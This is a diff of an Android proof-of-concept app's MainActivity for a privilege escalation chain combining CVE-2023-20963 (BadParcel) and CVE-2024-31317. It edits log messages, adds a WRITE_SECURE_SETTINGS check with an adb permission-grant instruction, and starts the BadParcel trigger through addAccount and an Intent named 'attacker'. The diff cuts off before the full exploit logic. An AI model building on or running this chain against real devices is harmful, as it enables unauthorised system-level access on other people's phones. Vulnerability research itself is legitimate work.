@@ -28,46 +28,34 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        appendLog("[*] ========================================");
-        appendLog("[*] CVE-2023-20963 + CVE-2024-31317 PoC");
-        appendLog("[*] Two-stage privilege escalation chain");
-        appendLog("[*] ========================================");
+        appendLog("========================================");
+        appendLog(" CVE-2023-20963 + CVE-2024-31317 PoC");
+        appendLog(" Two-Stage Privilege Escalation");
+        appendLog("========================================");
 
-        // ---- ステージ0: 通常アプリの権限確認 ----
-        appendLog("[*] Stage 0: Checking normal app permissions...");
-        checkNormalAppPermissions();
+        // 権限確認
+        appendLog("[*] Checking WRITE_SECURE_SETTINGS permission...");
+        try {
+            Settings.Global.putString(getContentResolver(), "test_permission", "dummy");
+            appendLog("[+] WRITE_SECURE_SETTINGS is granted (or test succeeded)");
+        } catch (Exception e) {
+            appendLog("[-] WRITE_SECURE_SETTINGS NOT granted: " + e.getMessage());
+            appendLog("[!] Please run: adb shell pm grant com.example.tzpoc android.permission.WRITE_SECURE_SETTINGS");
+        }
 
-        // ---- ステージ1: BadParcel (CVE-2023-20963) ----
+        // ステージ1: BadParcel をトリガー
         appendLog("[*] Stage 1: Triggering BadParcel (CVE-2023-20963)...");
         triggerBadParcel();
 
-        // ---- ステージ2: システム権限でCVE-2024-31317を実行（ProofActivityで実施） ----
-        appendLog("[*] Stage 2: Will be executed by ProofActivity if BadParcel succeeds");
+        // ステージ2以降は ProofActivity で実行
+        appendLog("[*] Stage 2-3 will be executed by ProofActivity if BadParcel succeeds");
 
-        // 15秒後に終了
+        // 20秒後に終了
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            appendLog("[*] PoC finished. Check /sdcard/Download/ for proof.");
+            appendLog("[*] PoC finished. Check /sdcard/Download/ and /data/local/tmp/");
             saveLog();
             finish();
         }, 20000);
-    }
-
-    private void checkNormalAppPermissions() {
-        try {
-            boolean result = Settings.Global.putString(getContentResolver(),
-                    "test_normal_app", "should_fail");
-            appendLog("[+] Settings.Global write (normal app): " + result + " (expected: false)");
-        } catch (Exception e) {
-            appendLog("[-] Settings.Global write error (normal app): " + e.getMessage());
-        }
-
-        try {
-            String val = Settings.Global.getString(getContentResolver(),
-                    "hidden_api_blacklist_exemptions");
-            appendLog("[+] Current hidden_api_blacklist_exemptions: " + val);
-        } catch (Exception e) {
-            appendLog("[-] Failed to read hidden_api_blacklist_exemptions: " + e.getMessage());
-        }
     }
 
     private void triggerBadParcel() {
@@ -76,7 +64,7 @@ public class MainActivity extends Activity {
             am.addAccount("com.example.tzpoc", null, null, null, this, null, null);
             appendLog("[+] addAccount triggered.");
         } catch (Exception e) {
-            appendLog("[+] addAccount triggered: " + e.getMessage());
+            appendLog("[+] addAccount triggered (may already exist): " + e.getMessage());
         }
 
         Intent attacker = new Intent();
